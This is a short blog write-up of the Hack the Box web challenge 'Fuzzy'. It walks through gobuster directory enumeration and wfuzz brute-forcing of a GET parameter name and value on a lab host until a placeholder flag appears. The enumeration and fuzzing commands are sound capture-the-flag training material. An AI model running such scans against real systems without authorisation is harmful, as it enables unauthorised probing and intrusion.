+++
title = "Hack the Box challenge: Fuzzy [Web]"
date = 2023-01-10
description = "Hack the Box challenge: Fuzzy [Web]"
tags = [
    "Hack the Box",
    "Challenge"
]
categories = [
    "Hack the Box",
    "Challenge"
]
series = ["Hack the Box"]
+++

Hack the Box challenge: Fuzzy [Web]
<!--more-->

# Fuzzy [Web]

## Enumeration

We enumerate first using `gobuster`:

```
# gobuster dir -u http://docker.hackthebox.eu:32079 -w /usr/share/wordlists/dirb/big.txt -t 30
```

or

```
# gobuster -u http://docker.hackthebox.eu:32079/ -w /usr/share/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,txt,html,htm`
```

We find `/api`, let’s use `gobuster` again:

```
# gobuster -u http://docker.hackthebox.eu:32079/api/ -w /usr/share/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,txt,html,htm,js,md`
```

We found the `action.php`, if we visit `http://docker.hackthebox.eu:32079/api/action.php` we get `Error: Parameter not set`. It’s telling us that our GET request parameters aren’t the goods ones.

## Fuzzing

We use `wfuzz` to brute force the GET parameter:

```
# wfuzz --hh=24 -c -w /usr/share/dirb/wordlists/big.txt http://docker.hackthebox.eu:32079/api/action.php?FUZZ=test
```

- hh (filter the length of characters in source code)
- c (Output with colors)
- w (Wordlist)
- FUZZ (FUZZ keyword will be replaced by the word from the wordlist)

And get a valid parameters with reset, giving us `http://docker.hackthebox.eu:32079/api/action.php?reset=`

We now need to find the right value for the reset parameter:

```
# wfuzz --hh=27 -c -w /usr/share/dirb/wordlists/big.txt http://docker.hackthebox.eu:32079/api/action.php?reset=FUZZ
```

and we get `20` as valid parameter. visit `http://docker.hackthebox.eu:32079/api/action.php?reset=20` in order to get the flag `HTB{FLAG}`
